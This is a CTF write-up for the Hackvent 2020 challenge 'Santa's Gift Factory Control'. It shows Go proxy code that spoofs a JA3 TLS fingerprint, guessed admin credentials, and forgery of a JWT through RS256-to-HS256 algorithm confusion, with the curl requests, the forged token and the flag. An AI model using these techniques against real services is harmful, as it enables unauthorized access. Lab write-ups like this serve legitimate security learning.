# HV20.17 Santa's Gift Factory Control

| <!-- --> | <!-- --> |
| --- | --- |
| **Author**     | fix86 |
| **Level**      | hard |
| **Categories** | `web security`, `crypto` |

## Description

Santa has a customized remote control panel for his gift factory at the north pole. Only clients with the following fingerprint seem to be able to connect:

`771,49162-49161-52393-49200-49199-49172-49171-52392,0-13-5-11-43-10,23-24,0`

### Mission
Connect to Santa's super-secret control panel and circumvent its access controls.

[Santa's Control Panel](https://876cfcc0-1928-4a71-a63e-29334ca287a0.rdocker.vuln.land/) (might be taken down after Hackvent 2020)

### Hints
- If you get a `403 forbidden`: this is part of the challenge
- The remote control panel does client fingerprinting
- There is an information leak somewhere which you need to solve the challenge
- The challenge is not solvable using brute force or injection vulnerabilities
- Newlines matter, check your files

## Approach

After a bit of web crawling, I found out that the given string `771,49162-49161-52393-49200-49199-49172-49171-52392,0-13-5-11-43-10,23-24,0` is a Ja3 TLS fingerprint (see https://ja3er.com/form).

To look for the client matching the fingerprint, I hashed it to an MD5 sum:
```bash
$ echo -n "771,49162-49161-52393-49200-49199-49172-49171-52392,0-13-5-11-43-10,23-24,0" | md5sum
a319533bd1a703430d9ad0e21c08c62f  -
```

`ja3er.com` returned `Go-http-client/1.1`. That, however, is a Golang version that's not available anymore.

After finding the blogpost at https://medium.com/cu-cyber/impersonating-ja3-fingerprints-b9f555880e42 it became clear that a Golang solution using https://github.com/cucyber/JA3Transport was needed to spoof/impersonate the Go 1.1 client.

After fiddling around with Go, implementing every request in Golang directly, compiling and running a Go binary, I decided to make this easier and to write a small proxy in Golang for local use, inspired by https://medium.com/swlh/proxy-server-in-golang-43e2365d9cbc.

The proxy:
```Golang
package main

import (
    "fmt"
    "github.com/CUCyber/ja3transport"
    "log"
    "net/http"
    "net/http/httputil"
    "net/url"
)

func main() {
    http.HandleFunc("/", Proxy)
    fmt.Println("About to listen on port 8081...")
    log.Fatal(http.ListenAndServe(":"+"8081", nil))
}

func Proxy(res http.ResponseWriter, req *http.Request) {
    uri := "https://876cfcc0-1928-4a71-a63e-29334ca287a0.rdocker.vuln.land"
    serveReverseProxy(uri, res, req)
}

func serveReverseProxy(target string, res http.ResponseWriter, req *http.Request) {
    uri, _ := url.Parse(target)
    tr, _ := ja3transport.NewTransport("771,49162-49161-52393-49200-49199-49172-49171-52392,0-13-5-11-43-10,23-24,0")

    proxy := httputil.NewSingleHostReverseProxy(uri)
    proxy.Transport = tr
    proxy.ServeHTTP(res, req)
}

```
With that proxy in place I was now able to run regular requests against localhost:8081 from curl or a browser.

![Login](./login.png)

Next on: guess the username/password to be `admin` and `admin` (sometimes you've got to be lucky - or, like in my case, be stuck for an hour and try every possible combination including "santa" until *mcia* arrives and gives you the much needed hint -\_-).

The response to this successfully authenticated request includes a cookie and an html comment leaking some important information...

```bash
$ curl -X POST http://localhost:8081/login -d username=admin -d password=admin -i
HTTP/1.1 200 OK
Content-Length: 1275
Content-Type: text/html; charset=utf-8
Date: Thu, 17 Dec 2020 21:24:17 GMT
Server: nginx/1.19.6
Set-Cookie: session=eyJ0eXAiOiJKV1QiLCJhbGciOiJSUzI1NiIsImtpZCI6Ii9rZXlzLzFkMjFhOWY5NDUifQ.eyJleHAiOjE2MDgyNDM4NTcsImlhdCI6MTYwODI0MDI1Nywic3ViIjoibm9uZSJ9.HGF-i9KGo1vJ8NNuzc8MD34kignUlQSIPwLQDwLNFMk7I56n7Yeze0FcE3ODHjya_40egTCCDkGG1w_GQpv70n_tuGVhOKvzkA75LMCR5lmvCNOhWhPbutdLq3dGLvlWn0xeiW9Hh-is3mhTHL5u-yz2EB4XGXnGLialWYnFpZAA1KUN1iJpZ0w1wQEBQAYIT5a6FS_195zX_XKeKhNV_2l9jcNqwr36nYxJaOlkgnXlI8KvcGQl6MNUFj4lzg9wbfwMqAw_98ZqoItQAIHidtoy7Qpx8Qv3PHM_yjmV4vHa9osiM-ZfnljooBJNl46oXCzLU7NSClfO6FlHoIeZgQ; Path=/

[...]

                <input type="password" name="password" placeholder="Password" id="password">
                
                    <div class="msg">Invalid credentials.</div>
                
                <input type="submit" value="Login">
            </form>
        </div>
        
            <!--DevNotice: User santa seems broken. Temporarily use santa1337.-->
        
    </body>
</html>
```

The cookie contains a JWT, which looks like the following in its decoded form: 
```json
{"typ":"JWT","alg":"RS256","kid":"/keys/1d21a9f945"}.{"exp":1608243857,"iat":1608240257,"sub":"none"}.<signature>
```

Let's go fetch the signing keys:
```bash
$ curl http://localhost:8081/keys/1d21a9f945 -i
HTTP/1.1 200 OK
Content-Length: 451
Content-Type: text/html; charset=utf-8
Date: Thu, 17 Dec 2020 20:26:29 GMT
Server: nginx/1.19.6

-----BEGIN PUBLIC KEY-----
MIIBIjANBgkqhkiG9w0BAQEFAAOCAQ8AMIIBCgKCAQEA0KDtdDsZ/wpGXWRnP6DY
Ri7OxTWiwPVg8eTsVcmbzAkk2r4itb3NqRw9xpJeUHorgfw1f9GkuAFg/squMrXb
SYM0Vcxqmtsq379xCw6s0pxIafPR7TEAVRh5Mxrudl2lwiO4vJPs+2tmcgui/bFn
wC+qByZtIlsP+rlT/MF2wLaWe/LNAWtOXdFVDOzUy6ylLZeL6fRtt9SiuUOQkkC3
US8TmvVQYcCcwvu4GBJeGdlKrbIuXIohl7hP5i9/KZ3kIvzByp/Xk5iq+tH95/9u
X/9FHKUSrcRE4NYVRhkqHPpn/EbqXHMX0BM0QoGETORlpZIo/lAOQ7/ezOd9z1fw
zwIDAQAB
-----END PUBLIC KEY-----

```

According to https://auth0.com/blog/critical-vulnerabilities-in-json-web-token-libraries/ there are several known flaws inherent to JWTs. 

Therefore, different variants are possible now:
1. Try whether the server accepts `"none"` algorithm --> *failed* (with `"sub"` set to each of the values `"none"`, `"admin"` and `"santa1337"`).
2. Sign the JWT using the HS256 algorithm and the public key, so that when the server decrypts the signature using the public key, it will get a valid result. --> *succeeded* (with `"sub": "santa1337"`)

To confirm whether it works, query the website:

```bash
$ curl -X GET http://localhost:8081/ -b 'session=<JWT-here>' -i
```

The final working request producing a response including the flag was:
```bash
$ curl -X GET http://localhost:8081/ -b 'session=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJleHAiOjE2MDgyNDM4NTcsImlhdCI6MTYwODI0MDI1Nywic3ViIjoic2FudGExMzM3In0._7cCkuK8MnGLM58xdhkkFAKy5UyrJQw7yzxA0brJ1eo' -i
HTTP/1.1 200 OK
Content-Length: 6515
Content-Type: text/html; charset=utf-8
Date: Thu, 17 Dec 2020 21:40:45 GMT
Server: nginx/1.19.6

<!DOCTYPE html>
<html>
    <head>
        <meta charset="utf-8">
        <title>Santa's Control Panel</title>
        <meta name="viewport" content="width=device-width, initial-scale=1.0">
        <link href="static/bootstrap/bootstrap.min.css" rel="stylesheet" media="screen">
        <link href="static/fontawesome/css/all.min.css" rel="stylesheet" media="screen">
        <link href="static/style.css" rel="stylesheet" media="screen">
    </head>
    <!--Congratulations, here's your flag: HV20{ja3_h45h_1mp3r50n4710n_15_fun}-->
    <body class="loggedin">
        <nav class="navtop">
            <div>
                <h1>Gift Factory Control</h1>
                <a href="/"><i class="fas fa-home"></i>Home</a>
                <a href="/logout"><i class="fas fa-sign-out-alt"></i>Logout</a>
            </div>
        </nav>

```

PS: Signing the JWT was made easy by CyberChef: [https://gchq.github.io/CyberChef/#recipe=JWT_Sign('-----BEGIN%2520PUBLIC%2520KEY...](https://gchq.github.io/CyberChef/#recipe=JWT_Sign('-----BEGIN%2520PUBLIC%2520KEY-----%255CnMIIBIjANBgkqhkiG9w0BAQEFAAOCAQ8AMIIBCgKCAQEA0KDtdDsZ/wpGXWRnP6DY%255CnRi7OxTWiwPVg8eTsVcmbzAkk2r4itb3NqRw9xpJeUHorgfw1f9GkuAFg/squMrXb%255CnSYM0Vcxqmtsq379xCw6s0pxIafPR7TEAVRh5Mxrudl2lwiO4vJPs%252B2tmcgui/bFn%255CnwC%252BqByZtIlsP%252BrlT/MF2wLaWe/LNAWtOXdFVDOzUy6ylLZeL6fRtt9SiuUOQkkC3%255CnUS8TmvVQYcCcwvu4GBJeGdlKrbIuXIohl7hP5i9/KZ3kIvzByp/Xk5iq%252BtH95/9u%255CnX/9FHKUSrcRE4NYVRhkqHPpn/EbqXHMX0BM0QoGETORlpZIo/lAOQ7/ezOd9z1fw%255CnzwIDAQAB%255Cn-----END%2520PUBLIC%2520KEY-----%255Cn','HS256')&input=eyJleHAiOjE2MDgyNDM4NTcsImlhdCI6MTYwODI0MDI1Nywic3ViIjoic2FudGExMzM3In0)

However(!!!), you had to keep the trailing newline at the end of the Public Key string. Because if you thought (like me): "Hey, let's be tidy and remove that trailing newline", you would get a different signature that would make an invalid JWT.... 

## Flag
`HV20{ja3_h45h_1mp3r50n4710n_15_fun}`
